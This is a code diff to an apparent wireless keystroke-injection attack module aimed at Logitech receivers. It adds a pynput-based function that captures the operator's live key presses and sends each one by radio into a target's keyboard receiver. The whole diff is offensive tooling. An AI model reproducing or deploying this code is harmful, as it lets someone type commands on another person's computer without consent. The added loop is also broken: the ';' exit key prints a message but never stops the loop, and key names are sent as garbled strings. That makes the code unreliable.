@@ -7,6 +7,7 @@ including scanning, channel sweeping and generic attack functions.
 from .hid_scan_codes import *
 from . import logitech
 import time
+from pynput import keyboard
 
 # constants
 PING_PAYLOAD = [0x0F, 0x0F, 0x0F, 0x0F] # the arbitrary ping payload used in find_frequency_channel()
@@ -62,6 +63,19 @@ def add_key_releases(keystrokes):
             new_keystrokes.append([KEY_RELEASE, KEY_MOD_NONE]) # adding a key release 
     new_keystrokes.append(keystrokes[-1]) # copying the last keystroke
     return new_keystrokes
+
+def transmit_string_while_writing(radio, vendor=logitech):
+    """
+    This function will listen to the client keyboard and for each key press will transmit that key
+    """
+    print('For each key will be pressed it will be transmited\nNOTE: to end transmit click ";"')
+    while True:
+        with keyboard.Events() as events:
+            # Block for as much as possible
+            event = events.get(1e6)
+            if event.key == keyboard.KeyCode.from_char(';'):
+                print('DONE Transmiting')
+            transmit_string(radio=radio, s=str(event.key), vendor=vendor)
 
 def transmit_string(radio, s, vendor=logitech):
     """
